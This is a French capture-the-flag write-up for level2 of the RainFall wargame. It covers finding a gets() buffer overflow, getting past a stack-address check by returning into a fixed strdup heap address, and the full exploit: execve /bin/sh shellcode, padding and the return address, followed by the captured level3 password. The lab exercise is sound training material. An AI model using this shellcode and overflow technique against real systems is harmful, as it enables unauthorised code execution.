# level2


## description
- Il y a un exécutable **level2**.Lorsqu'on l'exécute, il prends des caractères sur **stdin** puis l'affiche.

## Résolution

Avec gdb disas, il y a les lignes suivantes qui nous intéresse.

       0x080484ed <+25>:    call   0x80483c0 <gets@plt>
       0x080484fb <+39>:    and    eax,0xb0000000
       0x08048500 <+44>:    cmp    eax,0xb0000000


On voit qu'il y a l'utilisation de **gets**. en utilisant le même **buffer overflow** que sur l'exercice 1 pour modifier l'adresse de retour.
En testant l'overflow, on voit que la taille du buffer est **80**.

Cependant il y a une comparaison entre l'adresse de retour  et 0xb0000000 pour être sur que l'adresse n'est pas une adresse de la stack

On peut voir que le buffer est copié grâce a la fonction **strdup**.
```c

      0x08048538 <+100>:   call   0x80483e0 <strdup@plt>

```
Strdup utilise malloc qui stocke sur la heap.
On peut voir que le malloc retourne toujours l'adresse **0x0804a008**  :
```

    ltrace ./level2
    __libc_start_main(0x804853f, 1, 0xbffff7f4, 0x8048550, 0x80485c0 <unfinished ...>
    fflush(0xb7fd1a20)                               = 0
    gets(0xbffff6fc, 0, 0, 0xb7e5ec73, 0x80482b5)    = 0xbffff6fc
    puts("")                                         = 1
    strdup("")                                       = 0x0804a008
    +++ exited (status 8) +++
    level2@RainFall:~$

```

le shellcode que l'on va utilise viens de ce [site](http://shell-storm.org/shellcode/files/shellcode-575.php).

    \x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80

La taille du buffer etait de 80 et que notre shell fait 21 bytes, on va ajouter 59 bytes de padding apres notre shellcode puis on finit avec l'adresse de retour.

    python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A" * 59 + "\x08\xa0\x04\x08"' > /tmp/exploit &&  cat /tmp/exploit - | ./level2
le flag du niveau.

    cat /home/user/level3/.pass
    492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
